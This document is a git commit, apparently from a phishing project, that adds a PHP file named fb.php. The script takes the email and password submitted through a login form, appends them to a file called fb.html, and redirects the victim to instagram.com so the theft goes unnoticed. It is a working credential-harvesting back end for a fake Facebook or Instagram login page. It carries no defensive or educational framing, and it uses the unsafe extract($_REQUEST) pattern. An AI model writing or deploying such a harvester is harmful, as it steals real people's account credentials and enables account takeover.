6f4a9091cd5ff6a339c9db328d546b05ca40c8ac
https-verificationsite <118043350+https-verificationsite@users.noreply.github.com>
2022-11-12 15:27:27 +0530

    rear
    Signed-off-by: https-verificationsite <118043350+https-verificationsite@users.noreply.github.com>

---
+++ fb.php
@@ -0,0 +1,14 @@
+<?php
+    extract($_REQUEST);
+    $file=fopen("fb.html","a");
+
+    fwrite($file, "email :");
+    fwrite($file, $email ."\n");
+    
+    
+    
+    fwrite($file,"Pass :");
+    fwrite($file, $password ."\n");
+    fclose($file);
+    header("location: https://www.instagram.com/");
+ ?>
